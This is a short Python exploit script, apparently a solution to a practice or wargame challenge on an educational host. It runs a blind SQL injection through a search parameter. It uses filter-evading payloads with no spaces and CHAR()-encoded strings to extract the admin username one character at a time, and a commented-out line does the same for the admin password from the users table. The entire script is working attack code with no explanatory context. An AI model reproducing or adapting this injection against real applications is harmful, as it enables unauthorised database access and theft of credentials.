import requests
from time import sleep

url = "http://edu.arang.kr:8080/search.php"
n=1
while True:
    tmp = []
    for i in range(0,128):
        params = {
            "type":"a",
            "q": f"%')AND(IF((BINARY(SUBSTR((SELECT(username)FROM(users)WHERE(CHAR(105,115,95,97,100,109,105,110)=1)),{n},1)))=CHAR({i}),1,0))#"
            # "q": f"%')AND(IF((BINARY(SUBSTR((SELECT(password)FROM(users)WHERE(username=CHAR(97,100,109,105,110))AND(CHAR(105,115,95,97,100,109,105,110)=0)),{n},1)))=CHAR({i}),1,0))#"
        }

        response = requests.get(url, params=params)
        if "No products found." in response.text:
            pass
        else:
            tmp.append(chr(i))
            print(chr(i))
    n += 1
            
    
